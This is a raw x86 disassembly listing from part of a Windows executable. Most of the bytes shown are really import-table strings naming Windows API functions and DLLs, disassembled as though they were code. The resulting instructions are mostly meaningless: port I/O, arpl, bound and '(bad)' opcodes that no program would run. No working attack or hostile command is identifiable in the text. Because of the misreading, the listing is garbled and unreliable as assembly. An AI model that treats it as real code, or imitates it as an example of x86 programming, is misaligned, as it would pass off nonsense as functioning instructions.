  413550:	gs jbe 0x4135bc
  413553:	arpl   WORD PTR [ebp+0x43],sp
  413556:	popa   
  413557:	jo     0x4135cc
  413559:	add    BYTE PTR [esi+0x1],ch
  41355c:	inc    edi
  41355d:	gs je  0x4135b0
  413560:	imul   edi,DWORD PTR [eax+0x65],0xd500006c
  413567:	add    BYTE PTR [ebp+0x78],al
  41356a:	je     0x4135c0
  41356c:	gs js  0x4135e3
  41356f:	dec    edi
  413570:	jne    0x4135e6
  413572:	push   edi
  413573:	add    BYTE PTR [esi+0x65724300],ah
  413579:	popa   
  41357a:	je     0x4135e1
  41357c:	push   eax
  41357d:	popa   
  41357e:	je     0x4135f4
  413580:	gs jb  0x4135f1
  413583:	inc    edx
  413584:	jb     0x4135fb
  413586:	jae    0x4135f0
  413588:	add    BYTE PTR [eax],al
  41358a:	into   
  41358b:	add    BYTE PTR [ebp+0x78],al
  41358e:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  413592:	gs inc ebx
  413594:	ins    BYTE PTR es:[edi],dx
  413595:	imul   esi,DWORD PTR [eax+0x52],0x746365
  41359c:	lds    eax,FWORD PTR [eax]
  41359e:	inc    ebp
  41359f:	outs   dx,BYTE PTR ds:[esi]
  4135a0:	jne    0x41360f
  4135a2:	inc    esi
  4135a3:	outs   dx,DWORD PTR ds:[esi]
  4135a4:	outs   dx,BYTE PTR ds:[esi]
  4135a5:	je     0x4135ed
  4135a7:	popa   
  4135a8:	ins    DWORD PTR es:[edi],dx
  4135a9:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x47005773
  4135b1:	inc    esp
  4135b2:	dec    ecx
  4135b3:	xor    esi,DWORD PTR [edx]
  4135b5:	cs fs ins BYTE PTR es:[edi],dx
  4135b8:	ins    BYTE PTR es:[edi],dx
  4135b9:	add    BYTE PTR [edi+0x74654701],bl
  4135bf:	inc    ebx
  4135c0:	outs   dx,DWORD PTR ds:[esi]
  4135c1:	ins    DWORD PTR es:[edi],dx
  4135c2:	jo     0x413639
  4135c4:	je     0x41362b
  4135c6:	jb     0x413616
  4135c8:	popa   
  4135c9:	ins    DWORD PTR es:[edi],dx
  4135ca:	gs inc ecx
  4135cc:	add    BYTE PTR [eax],al
  4135ce:	sbb    eax,0x74655304
  4135d3:	dec    eax
  4135d4:	popa   
  4135d5:	outs   dx,BYTE PTR ds:[esi]
  4135d6:	fs ins BYTE PTR es:[edi],dx
  4135d8:	gs inc ebx
  4135da:	outs   dx,DWORD PTR ds:[esi]
  4135db:	jne    0x41364b
  4135dd:	je     0x4135df
  4135df:	add    BYTE PTR [edx],bh
  4135e1:	add    ecx,DWORD PTR [edi+0x70]
  4135e4:	outs   dx,BYTE PTR gs:[esi]
  4135e6:	inc    esi
  4135e7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x4300f200
  4135ef:	jb     0x413656
  4135f1:	popa   
  4135f2:	je     0x413659
  4135f4:	push   edi
  4135f5:	popa   
  4135f6:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  4135fe:	ins    DWORD PTR es:[edi],dx
  4135ff:	gs jb  0x413643
  413602:	add    BYTE PTR [eax],al
  413604:	and    al,0x3
  413606:	dec    ebp
  413607:	popa   
  413608:	jo     0x413660
  41360a:	imul   esp,DWORD PTR [ebp+0x77],0x6946664f
  413611:	ins    BYTE PTR es:[edi],dx
  413612:	add    BYTE PTR gs:[esp+eax*1],bh
  413616:	push   ebx
  413617:	gs je  0x41366e
  41361a:	push   0x64616572
  41361f:	push   eax
  413620:	jb     0x41368b
  413622:	outs   dx,DWORD PTR ds:[esi]
  413623:	jb     0x41368e
  413625:	je     0x4136a0
  413627:	add    BYTE PTR [edx+0x6f6c4702],dl
  41362d:	bound  esp,QWORD PTR [ecx+0x6c]
  413630:	inc    edi
  413631:	gs je  0x413675
  413634:	je     0x4136a5
  413636:	ins    DWORD PTR es:[edi],dx
  413637:	dec    esi
  413638:	popa   
  413639:	ins    DWORD PTR es:[edi],dx
  41363a:	gs push edi
  41363c:	add    BYTE PTR [eax],al
  41363e:	retf   
  41363f:	add    cl,BYTE PTR [ecx+0x73]
  413642:	inc    edx
  413643:	popa   
  413644:	fs push edx
  413646:	gs popa 
  413648:	fs push eax
  41364a:	je     0x4136be
  41364c:	add    BYTE PTR [eax],al
  41364e:	or     BYTE PTR [ecx],al
  413650:	inc    esp
  413651:	gs jbe 0x4136bd
  413654:	arpl   WORD PTR [ebp+0x49],sp
  413657:	outs   dx,DWORD PTR ds:[esi]
  413658:	inc    ebx
  413659:	outs   dx,DWORD PTR ds:[esi]
  41365a:	outs   dx,BYTE PTR ds:[esi]
  41365b:	je     0x4136cf
  41365d:	outs   dx,DWORD PTR ds:[esi]
  41365e:	ins    BYTE PTR es:[edi],dx
  41365f:	add    BYTE PTR [ecx+0x1],bl
  413662:	inc    esi
  413663:	imul   ebp,DWORD PTR [esi+0x64],0x736f6c43
  41366a:	add    BYTE PTR gs:[edx],cl
  41366d:	add    al,BYTE PTR [edi+0x65]
  413670:	je     0x4136bf
  413672:	outs   dx,DWORD PTR ds:[esi]
  413673:	fs jne 0x4136e2
  413676:	gs dec eax
  413678:	popa   
  413679:	outs   dx,BYTE PTR ds:[esi]
  41367a:	fs ins BYTE PTR es:[edi],dx
  41367c:	gs inc ecx
  41367e:	add    BYTE PTR [eax],al
  413680:	inc    edx
  413681:	add    DWORD PTR [esi+0x69],eax
  413684:	outs   dx,BYTE PTR ds:[esi]
  413685:	fs dec esi
  413687:	gs js  0x4136fe
  41368a:	inc    ebx
  41368b:	push   0x65676e61
  413690:	dec    esi
  413691:	outs   dx,DWORD PTR ds:[esi]
  413692:	je     0x4136fd
  413694:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41369a:	outs   dx,DWORD PTR ds:[esi]
  41369b:	outs   dx,BYTE PTR ds:[esi]
  41369c:	add    BYTE PTR [eax],al
  41369e:	xor    eax,0x74655304
  4136a3:	push   esp
  4136a4:	push   0x64616572
  4136a9:	inc    ecx
  4136aa:	data16 imul bp,WORD PTR [esi+0x69],0x7974
  4136b1:	dec    ebp
  4136b2:	popa   
  4136b3:	jae    0x413720
  4136b5:	add    BYTE PTR [esi],bl
  4136b7:	add    al,BYTE PTR [edi+0x65]
  4136ba:	je     0x41370c
  4136bc:	jb     0x413727
  4136be:	outs   dx,DWORD PTR ds:[esi]
  4136bf:	jb     0x41372a
  4136c1:	je     0x41373c
  4136c3:	inc    ebx
  4136c4:	ins    BYTE PTR es:[edi],dx
  4136c5:	popa   
  4136c6:	jae    0x41373b
  4136c8:	add    BYTE PTR [eax],al
  4136ca:	sti    
  4136cb:	add    DWORD PTR [edi+0x65],eax
  4136ce:	je     0x41371c
  4136d0:	popa   
  4136d1:	jae    0x413747
  4136d3:	inc    ebp
  4136d4:	jb     0x413748
  4136d6:	outs   dx,DWORD PTR ds:[esi]
  4136d7:	jb     0x4136d9
  4136d9:	add    BYTE PTR [edi],dl
  4136db:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  4136df:	imul   eax,DWORD PTR [esi+0x69],0x6c
  4136e3:	add    BYTE PTR gs:[eax],al
  4136e6:	retf   
  4136e7:	add    DWORD PTR [edi+0x65],eax
  4136ea:	je     0x41372f
  4136ec:	jne    0x413760
  4136ee:	jb     0x413755
  4136f0:	outs   dx,BYTE PTR ds:[esi]
  4136f1:	je     0x413737
  4136f3:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4136fa:	jns    0x413753
  4136fc:	add    BYTE PTR [eax],al
  4136fe:	mov    BYTE PTR [eax],al
  413700:	inc    ecx
  413701:	jb     0x413768
  413703:	inc    esi
  413704:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x41736970
  41370c:	dec    esi
  41370d:	push   ebx
  41370e:	dec    ecx
  41370f:	add    BYTE PTR ds:0x74655304,ah
  413715:	dec    ebp
  413716:	popa   
  413717:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x6e49746f
  41371f:	outs   dx,WORD PTR ds:[esi]
  413721:	add    dl,cl
  413723:	add    BYTE PTR [ebx+0x72],al
  413726:	gs popa 
  413728:	je     0x41378f
  41372a:	inc    ebp
  41372b:	jbe    0x413792
  41372d:	outs   dx,BYTE PTR ds:[esi]
  41372e:	je     0x413771
  413730:	add    BYTE PTR [eax],al
  413732:	outs   dx,BYTE PTR ds:[esi]
  413733:	add    DWORD PTR [esi+0x69],eax
  413736:	outs   dx,BYTE PTR ds:[esi]
  413737:	fs push edx
  413739:	gs jae 0x4137ab
  41373c:	jne    0x4137b0
  41373e:	arpl   WORD PTR [ebp+0x45],sp
  413741:	js     0x41379a
  413743:	add    BYTE PTR [eax+0x3],bh
  413746:	push   edx
  413747:	gs popa 
  413749:	fs inc esi
  41374b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x47026100
  413753:	gs je  0x4137aa
  413756:	gs ins DWORD PTR es:[edi],dx
  413758:	jo     0x4137aa
  41375a:	popa   
  41375b:	je     0x4137c5
  41375d:	inc    ecx
  41375e:	add    BYTE PTR [eax],al
  413760:	mov    DWORD PTR [edx],eax
  413762:	inc    edi
  413763:	ins    BYTE PTR es:[edi],dx
  413764:	outs   dx,DWORD PTR ds:[esi]
  413765:	bound  esp,QWORD PTR [ecx+0x6c]
  413768:	inc    ecx
  413769:	ins    BYTE PTR es:[edi],dx
  41376a:	ins    BYTE PTR es:[edi],dx
  41376b:	outs   dx,DWORD PTR ds:[esi]
  41376c:	arpl   WORD PTR [eax],ax
  41376e:	xchg   esp,eax
  41376f:	add    al,0x57
  413771:	imul   ebp,DWORD PTR [esi+0x45],0x636578
  413778:	bound  eax,QWORD PTR [edx]
  41377a:	inc    edi
  41377b:	gs je  0x4137d2
  41377e:	gs ins DWORD PTR es:[edi],dx
  413780:	jo     0x4137d2
  413782:	popa   
  413783:	je     0x4137ed
  413785:	push   edi
  413786:	add    BYTE PTR [eax],al
  413788:	rol    BYTE PTR [eax],1
  41378a:	inc    ebx
  41378b:	jb     0x4137f2
  41378d:	popa   
  41378e:	je     0x4137f5
  413790:	inc    esi
  413791:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x47026700
  413799:	gs je  0x4137f0
  41379c:	push   0x64616572
  4137a1:	dec    esp
  4137a2:	outs   dx,DWORD PTR ds:[esi]
  4137a3:	arpl   WORD PTR [ecx+0x6c],sp
  4137a6:	add    BYTE PTR gs:[eax],ah
  4137a9:	add    DWORD PTR [ebp+0x6e],eax
  4137ac:	jne    0x41381b
  4137ae:	push   edx
  4137af:	gs jae 0x413821
  4137b2:	jne    0x413826
  4137b4:	arpl   WORD PTR [ebp+0x4e],sp
  4137b7:	popa   
  4137b8:	ins    DWORD PTR es:[edi],dx
  4137b9:	gs jae 0x4137fd
  4137bc:	add    BYTE PTR [eax],al
  4137be:	repz add DWORD PTR [edi+0x65],eax
  4137c2:	je     0x41380a
  4137c4:	jne    0x413832
  4137c6:	ins    BYTE PTR es:[edi],dx
  4137c7:	push   eax
  4137c8:	popa   
  4137c9:	je     0x413833
  4137cb:	dec    esi
  4137cc:	popa   
  4137cd:	ins    DWORD PTR es:[edi],dx
  4137ce:	gs push edi
  4137d0:	add    BYTE PTR [eax],al
  4137d2:	push   eax
  4137d3:	add    DWORD PTR [esi+0x69],eax
  4137d6:	ins    BYTE PTR es:[edi],dx
  4137d7:	gs push esp
  4137d9:	imul   ebp,DWORD PTR [ebp+0x65],0x79536f54
  4137e0:	jae    0x413856
  4137e2:	gs ins DWORD PTR es:[edi],dx
  4137e4:	push   esp
  4137e5:	imul   ebp,DWORD PTR [ebp+0x65],0xe60000
  4137ec:	inc    ebx
  4137ed:	jb     0x413854
  4137ef:	popa   
  4137f0:	je     0x413857
  4137f2:	push   edx
  4137f3:	gs ins DWORD PTR es:[edi],dx
  4137f5:	outs   dx,DWORD PTR ds:[esi]
  4137f6:	je     0x41385d
  4137f8:	push   esp
  4137f9:	push   0x64616572
  4137fe:	add    BYTE PTR [eax],al
  413800:	jns    0x413804
  413802:	inc    edi
  413803:	gs je  0x41385c
  413806:	gs jb  0x41387c
  413809:	imul   ebp,DWORD PTR [edi+0x6e],0x1010000
  413810:	inc    esp
  413811:	gs ins BYTE PTR es:[edi],dx
  413813:	gs je  0x41387b
  413816:	inc    ebx
  413817:	jb     0x413882
  413819:	je     0x413884
  41381b:	arpl   WORD PTR [ecx+0x6c],sp
  41381e:	push   ebx
  41381f:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  413824:	outs   dx,BYTE PTR ds:[esi]
  413825:	add    BYTE PTR [ecx],cl
  413827:	add    al,BYTE PTR [edi+0x65]
  41382a:	je     0x413879
  41382c:	outs   dx,DWORD PTR ds:[esi]
  41382d:	fs jne 0x41389c
  413830:	gs inc esi
  413832:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  41383a:	add    BYTE PTR [eax],al
  41383c:	dec    edi
  41383d:	add    al,0x53
  41383f:	jne    0x4138b4
  413841:	jo     0x4138a8
  413843:	outs   dx,BYTE PTR ds:[esi]
  413844:	fs push esp
  413846:	push   0x64616572
  41384b:	add    ah,cl
  41384d:	add    al,0x6c
  41384f:	jae    0x4138c5
  413851:	jb     0x4138b6
  413853:	jo     0x4138ce
  413855:	outs   dx,BYTE PTR ds:[esi]
  413856:	push   edi
  413857:	add    bh,dh
  413859:	add    DWORD PTR [edi+0x65],eax
  41385c:	je     0x4138a6
  41385e:	popa   
  41385f:	outs   dx,BYTE PTR ds:[esi]
  413860:	fs ins BYTE PTR es:[edi],dx
  413862:	gs dec ecx
  413864:	outs   dx,BYTE PTR ds:[esi]
  413865:	outs   dx,WORD PTR ds:[esi]
  413867:	jb     0x4138d6
  413869:	popa   
  41386a:	je     0x4138d5
  41386c:	outs   dx,DWORD PTR ds:[esi]
  41386d:	outs   dx,BYTE PTR ds:[esi]
  41386e:	add    BYTE PTR [eax],al
  413870:	or     eax,DWORD PTR [ebx]
  413872:	dec    esp
  413873:	outs   dx,DWORD PTR ds:[esi]
  413874:	arpl   WORD PTR [ecx+0x6c],sp
  413877:	inc    ecx
  413878:	ins    BYTE PTR es:[edi],dx
  413879:	ins    BYTE PTR es:[edi],dx
  41387a:	outs   dx,DWORD PTR ds:[esi]
  41387b:	arpl   WORD PTR [eax],ax
  41387d:	add    BYTE PTR [ebx+0x2],ah
  413880:	inc    edi
  413881:	gs je  0x4138d8
  413884:	push   0x64616572
  413889:	inc    ebx
  41388a:	outs   dx,DWORD PTR ds:[esi]
  41388b:	outs   dx,BYTE PTR ds:[esi]
  41388c:	je     0x4138f3
  41388e:	js     0x413904
  413890:	add    BYTE PTR [eax],al
  413892:	ret    
  413893:	add    edx,DWORD PTR [edx+0x74]
  413896:	ins    BYTE PTR es:[edi],dx
  413897:	push   ebp
  413898:	outs   dx,BYTE PTR ds:[esi]
  413899:	ja     0x413904
  41389b:	outs   dx,BYTE PTR ds:[esi]
  41389c:	add    BYTE PTR fs:[ecx+eax*1+0x41746547],cl
  4138a4:	je     0x413915
  4138a6:	ins    DWORD PTR es:[edi],dx
  4138a7:	dec    esi
  4138a8:	popa   
  4138a9:	ins    DWORD PTR es:[edi],dx
  4138aa:	gs push edi
  4138ac:	add    BYTE PTR [eax],al
  4138ae:	jmp    0x6946:0x74654701
  4138b5:	ins    BYTE PTR es:[edi],dx
  4138b6:	gs inc ecx
  4138b8:	je     0x41392e
  4138ba:	jb     0x413925
  4138bc:	bound  esi,QWORD PTR [ebp+0x74]
  4138bf:	gs jae 0x413907
  4138c2:	js     0x413905
  4138c4:	add    BYTE PTR [eax],al
  4138c6:	inc    edx
  4138c7:	add    al,BYTE PTR [edi+0x65]
  4138ca:	je     0x41391f
  4138cc:	push   0x5074726f
  4138d1:	popa   
  4138d2:	je     0x41393c
  4138d4:	dec    esi
  4138d5:	popa   
  4138d6:	ins    DWORD PTR es:[edi],dx
  4138d7:	gs inc ecx
  4138d9:	add    bl,bl
  4138db:	add    edx,DWORD PTR [ebx+0x65]
  4138de:	popa   
  4138df:	jb     0x413944
  4138e1:	push   0x68746150
  4138e6:	inc    ecx
  4138e7:	add    BYTE PTR [eax+0x4],al
  4138ea:	push   ebx
  4138eb:	gs je  0x413942
  4138ee:	imul   ebp,DWORD PTR [ebp+0x65],0x65755172
  4138f5:	jne    0x41395c
  4138f7:	push   esp
  4138f8:	imul   ebp,DWORD PTR [ebp+0x65],0xb4000072
  4138ff:	add    edx,DWORD PTR [edx+0x65]
  413902:	ins    DWORD PTR es:[edi],dx
  413903:	outs   dx,DWORD PTR ds:[esi]
  413904:	jbe    0x41396b
  413906:	inc    esp
  413907:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  41390e:	jns    0x413967
  413910:	add    BYTE PTR [eax],al
  413912:	ret    
  413913:	add    al,0x6c
  413915:	jae    0x41398b
  413917:	jb     0x41397c
  413919:	ins    DWORD PTR es:[edi],dx
  41391a:	jo     0x413973
  41391c:	add    BYTE PTR [eax],al
  41391e:	dec    edi
  41391f:	add    DWORD PTR [esi+0x69],eax
  413922:	ins    BYTE PTR es:[edi],dx
  413923:	gs push esp
  413925:	imul   ebp,DWORD PTR [ebp+0x65],0x6f4c6f54
  41392c:	arpl   WORD PTR [ecx+0x6c],sp
  41392f:	inc    esi
  413930:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656d69
  413938:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413939:	add    BYTE PTR [ebx+0x61],al
  41393c:	outs   dx,BYTE PTR ds:[esi]
  41393d:	arpl   WORD PTR [ebp+0x6c],sp
  413940:	push   edi
  413941:	popa   
  413942:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  41394a:	ins    DWORD PTR es:[edi],dx
  41394b:	gs jb  0x41394e
  41394e:	dec    ebx
  41394f:	inc    ebp
  413950:	push   edx
  413951:	dec    esi
  413952:	inc    ebp
  413953:	dec    esp
  413954:	xor    esi,DWORD PTR [edx]
  413956:	cs fs ins BYTE PTR es:[edi],dx
  413959:	ins    BYTE PTR es:[edi],dx
  41395a:	add    BYTE PTR [eax],al
  41395c:	inc    esi
  41395d:	add    BYTE PTR [eax+0x61],dl
  413960:	je     0x4139ca
  413962:	inc    esi
  413963:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  41396a:	outs   dx,BYTE PTR ds:[esi]
  41396b:	jae    0x4139d6
  41396d:	outs   dx,DWORD PTR ds:[esi]
  41396e:	outs   dx,BYTE PTR ds:[esi]
  41396f:	inc    ecx
  413970:	add    BYTE PTR [eax],al
  413972:	inc    edi
  413973:	add    BYTE PTR [eax+0x61],dl
  413976:	je     0x4139e0
  413978:	inc    esi
  413979:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  413980:	outs   dx,BYTE PTR ds:[esi]
  413981:	jae    0x4139ec
  413983:	outs   dx,DWORD PTR ds:[esi]
  413984:	outs   dx,BYTE PTR ds:[esi]
  413985:	push   edi
  413986:	add    BYTE PTR [eax],al
  413988:	push   ebx
  413989:	dec    eax
  41398a:	dec    esp
  41398b:	push   edi
  41398c:	inc    ecx
  41398d:	push   eax
  41398e:	dec    ecx
  41398f:	cs fs ins BYTE PTR es:[edi],dx
  413992:	ins    BYTE PTR es:[edi],dx
  413993:	add    BYTE PTR [ebx+0x46],dh
  413996:	addr16 popa 
  413998:	pop    ecx
  413999:	dec    ebp
  41399a:	popa   
  41399b:	jns    0x4139f1
  41399d:	push   ecx
  41399e:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  4139a2:	je     0x413a05
  4139a4:	inc    ebx
  4139a5:	push   ecx
  4139a6:	ins    BYTE PTR es:[edi],dx
  4139a7:	pop    eax
  4139a8:	add    BYTE PTR [eax],al
  4139aa:	add    BYTE PTR [eax],al
  4139ac:	or     al,0x3e
  4139ae:	inc    ecx
  4139af:	add    BYTE PTR [esi+edi*1],dl
  4139b2:	inc    ecx
  4139b3:	add    ah,dh
  4139b5:	cmp    eax,DWORD PTR [ecx+0x0]
  4139b8:	call   0x794febc8
  4139bd:	dec    edi
  4139be:	ret    0x774e
  4139c1:	dec    edi
  4139c2:	cmp    eax,0x384f4f4f
  4139c7:	dec    edi
  4139c8:	jp     0x413a19
  4139ca:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139cd:	dec    edi
  4139ce:	ss dec edi
  4139d0:	add    ecx,DWORD PTR [edi+0x31]
  4139d3:	dec    edi
  4139d4:	ret    0x324e
  4139d7:	dec    edi
  4139d8:	push   ds
  4139d9:	push   edx
  4139da:	pop    ds
  4139db:	push   ebx
  4139dc:	cmp    DWORD PTR [edi+0x79],ecx
  4139df:	dec    edi
  4139e0:	ret    0x774e
  4139e3:	dec    edi
  4139e4:	cmp    eax,0x384f4f4f
  4139e9:	dec    edi
  4139ea:	jp     0x413a3b
  4139ec:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139ef:	dec    edi
  4139f0:	ss dec edi
  4139f2:	imul   ecx,DWORD PTR [edi+0x31],0x324ec24f
  4139f9:	dec    edi
  4139fa:	push   ds
  4139fb:	bound  ebx,QWORD PTR [edi]
  4139fd:	arpl   WORD PTR [ecx],di
  4139ff:	dec    edi
  413a00:	jns    0x413a51
  413a02:	ret    0x724e
  413a05:	dec    edi
  413a06:	cmp    eax,0x394f034f
  413a0b:	dec    edi
  413a0c:	dec    esp
  413a0d:	dec    edi
  413a0e:	xor    al,0x4f
  413a10:	ret    0x304e
  413a13:	dec    edi
  413a14:	push   ds
  413a15:	jb     0x413a36
  413a17:	jae    0x413a28
  413a19:	or     DWORD PTR [eax],0xffffff80
  413a1c:	js     0x4139ae
  413a1e:	jns    0x4139b1
  413a20:	aas    
  413a21:	dec    edi
  413a22:	jbe    0x413a73
  413a24:	ret    0x764e
  413a27:	dec    edi
  413a28:	ds dec edi
  413a2a:	dec    esp
  413a2b:	dec    edi
  413a2c:	cmp    DWORD PTR [edi+0x3],ecx
  413a2f:	dec    edi
  413a30:	xor    eax,0x364ec24f
  413a35:	dec    edi
  413a36:	push   ds
  413a37:	sbb    BYTE PTR [edi],0x83
  413a3a:	setae  BYTE PTR [eax]
  413a3d:	nop
  413a3e:	js     0x4139e0
  413a40:	jns    0x4139e3
  413a42:	aas    
  413a43:	dec    edi
  413a44:	jbe    0x413a95
  413a46:	ret    0x764e
  413a49:	dec    edi
  413a4a:	ds dec edi
  413a4c:	dec    esp
  413a4d:	dec    edi
  413a4e:	cmp    DWORD PTR [edi+0x69],ecx
  413a51:	dec    edi
  413a52:	xor    eax,0x364ec24f
  413a57:	dec    edi
  413a58:	push   ds
  413a59:	xchg   edx,eax
  413a5a:	pop    ds
  413a5b:	xchg   ebx,eax
  413a5c:	bt     DWORD PTR [eax],ecx
  413a5f:	mov    al,ds:0xb179b078
  413a64:	aas    
  413a65:	dec    edi
  413a66:	push   0x4e4ec24f
  413a6b:	dec    edi
  413a6c:	cmp    eax,0x394f034f
  413a71:	dec    edi
  413a72:	push   ecx
  413a73:	dec    edi
  413a74:	xor    al,0x4f
  413a76:	ret    0x364e
  413a79:	dec    edi
  413a7a:	push   ds
  413a7b:	mov    ds:0xb30fa31f,al
  413a80:	or     BYTE PTR [eax-0x3e863f88],dh
  413a86:	aas    
  413a87:	dec    edi
  413a88:	push   0x4e4ec24f
  413a8d:	dec    edi
  413a8e:	cmp    eax,0x394f784f
  413a93:	dec    edi
  413a94:	pop    edi
  413a95:	dec    edi
  413a96:	cmp    ecx,DWORD PTR [edi-0x3e]
  413a99:	dec    esi
  413a9a:	xor    eax,0x1fb21e4f
  413a9f:	mov    bl,0xf
  413aa1:	ret    
  413aa2:	or     al,al
  413aa4:	js     0x413a76
  413aa6:	jns    0x413a79
  413aa8:	aas    
  413aa9:	dec    edi
  413aaa:	push   0x4e4ec24f
  413aaf:	dec    edi
  413ab0:	cmp    eax,0x394f724f
  413ab5:	dec    edi
  413ab6:	dec    esi
  413ab7:	dec    edi
  413ab8:	xor    al,0x4f
  413aba:	ret    0x304e
  413abd:	dec    edi
  413abe:	push   ds
  413abf:	ret    0xc31f
  413ac2:	psrlq  mm1,QWORD PTR [eax]
  413ac5:	sar    BYTE PTR [eax-0x20],1
  413ac8:	jns    0x413aab
  413aca:	aas    
  413acb:	dec    edi
  413acc:	push   0x4e4ec24f
  413ad1:	dec    edi
  413ad2:	cmp    eax,0x394f734f
  413ad7:	dec    edi
  413ad8:	dec    esp
  413ad9:	dec    edi
  413ada:	xor    al,0x4f
  413adc:	ret    0x364e
  413adf:	dec    edi
  413ae0:	push   ds
  413ae1:	rcr    BYTE PTR [edi],cl
  413ae3:	ror    DWORD PTR [edi],cl
  413ae5:	jecxz  0x413aef
  413ae7:	loopne 0x413b61
  413ae9:	lock jns 0x413add
  413aec:	aas    
  413aed:	dec    edi
  413aee:	ins    DWORD PTR es:[edi],dx
  413aef:	dec    edi
  413af0:	ret    0x5f4e
  413af3:	dec    edi
  413af4:	cmp    eax,0x3e4f524f
  413af9:	dec    edi
  413afa:	ret    0x3f4e
  413afd:	dec    edi
  413afe:	push   ds
  413aff:	loop   0x413b20
  413b01:	jecxz  0x413b12
  413b03:	repz or al,dh
  413b06:	js     0x413b08
  413b08:	jns    0x413b0b
  413b0a:	js     0x413b1c
  413b0c:	jns    0x413b1f
  413b0e:	ds dec edi
  413b10:	jg     0x413b61
  413b12:	ret    0x5b4e
  413b15:	dec    edi
  413b16:	cmp    al,0x4f
  413b18:	jb     0x413b69
  413b1a:	ds dec edi
  413b1c:	dec    ebp
  413b1d:	dec    edi
  413b1e:	cmp    ecx,DWORD PTR [edi-0x3e]
  413b21:	dec    esi
  413b22:	xor    eax,0x1f021e4f
  413b27:	add    ecx,DWORD PTR [edi]
  413b29:	adc    ecx,DWORD PTR [eax]
  413b2b:	adc    BYTE PTR [eax+0x20],bh
  413b2e:	jns    0x413b51
  413b30:	aas    
  413b31:	dec    edi
  413b32:	add    BYTE PTR [eax],al
  413b34:	mov    esp,0xb0004139
  413b39:	cmp    eax,DWORD PTR [ecx+0x0]
  413b3c:	mov    eax,0x1800413b
  413b41:	ds inc ecx
  413b43:	add    BYTE PTR [ebp+edi*1+0x41],bh
  413b47:	add    BYTE PTR [eax],cl
  413b49:	ds inc ecx
  413b4b:	add    BYTE PTR [eax-0x63ffbec5],bl
  413b51:	cmp    eax,DWORD PTR [ecx+0x0]
  413b54:	add    BYTE PTR [esi],bh
  413b56:	inc    ecx
  413b57:	add    BYTE PTR [eax],al
  413b59:	cmp    al,0x41
  413b5b:	add    BYTE PTR [edx-0x4e076357],cl
  413b61:	mov    edx,0x3bb4f89c
  413b66:	inc    ecx
  413b67:	add    BYTE PTR [eax],bh
  413b69:	cmp    eax,0x3d4c0041
  413b6e:	inc    ecx
  413b6f:	add    BYTE PTR [eax+0x3d],bl
  413b72:	inc    ecx
  413b73:	add    BYTE PTR [eax+0x3d],ch
  413b76:	inc    ecx
  413b77:	add    ah,ch
  413b79:	cmp    eax,DWORD PTR [ecx+0x0]
  413b7c:	mov    eax,0xc004139
  413b81:	cmp    al,0x41
  413b83:	add    ah,bh
  413b85:	cmp    eax,DWORD PTR [ecx+0x0]
  413b88:	sbb    al,0x3e
  413b8a:	inc    ecx
  413b8b:	add    BYTE PTR [ecx],dh
  413b8d:	test   DWORD PTR [eax+edi*8-0x7ee8f462],ebx
  413b94:	sar    BYTE PTR [ebx],0x41
  413b97:	add    BYTE PTR [ebx-0x707ee9e4],dl
  413b9d:	or     eax,0x705
  413ba2:	inc    eax
  413ba3:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  413ba7:	(bad)  
  413ba9:	ss inc ebx
  413bab:	add    BYTE PTR [edx+0x68],dh
  413bae:	inc    ebp
  413baf:	inc    ecx
  413bb0:	(bad)  
  413bb1:	cli    
  413bb2:	jne    0x413c16
  413bb4:	(bad)  
  413bb5:	in     eax,dx
  413bb6:	inc    BYTE PTR [edi]
  413bb8:	mov    eax,0xa805a3fa
  413bbd:	cmp    eax,DWORD PTR [ecx+0x0]
  413bc0:	xor    dl,BYTE PTR [ebp-0x69cd0764]
  413bc6:	pushf  
  413bc7:	clc    
  413bc8:	xor    edx,DWORD PTR [ebp-0x6ac30764]
  413bce:	pushf  
  413bcf:	clc    
  413bd0:	cmp    eax,0x3ef89c95
  413bd5:	xchg   ebp,eax
  413bd6:	pushf  
  413bd7:	clc    
  413bd8:	aas    
  413bd9:	xchg   ebp,eax
  413bda:	pushf  
  413bdb:	clc    
  413bdc:	cmp    BYTE PTR [ebp-0x6ac60764],dl
  413be2:	pushf  
  413be3:	clc    
  413be4:	cmp    dl,BYTE PTR [ebp-0x6ade0764]
  413bea:	pushf  
  413beb:	clc    
  413bec:	in     eax,dx
  413bed:	stc    
  413bee:	add    esp,DWORD PTR [eax-0x50]
  413bf1:	cmp    DWORD PTR [ecx+0x0],eax
  413bf4:	je     0x413bf7
  413bf6:	inc    ebx
  413bf7:	add    BYTE PTR [ecx+0x49],bl
  413bfa:	imul   si,WORD PTR [ecx],0xff85
  413bfe:	pushf  
  413bff:	clc    
  413c00:	sahf   
  413c01:	jmp    0x4f04356
  413c06:	add    BYTE PTR [eax],al
  413c08:	lods   al,BYTE PTR ds:[esi]
  413c09:	cmp    DWORD PTR [ecx+0x0],eax
  413c0c:	pushf  
  413c0d:	or     eax,DWORD PTR [esi+ecx*1]
	...
  413c40:	addr16 jg 0x413c83
  413c43:	add    dl,ch
  413c45:	adc    DWORD PTR [ebx+0x0],eax
  413c48:	add    BYTE PTR [eax],al
  413c4a:	add    BYTE PTR [eax],al
  413c4c:	inc    esp
  413c4d:	add    BYTE PTR [esi+0x0],al
  413c50:	imul   eax,DWORD PTR [eax],0x4a006f
  413c56:	dec    ecx
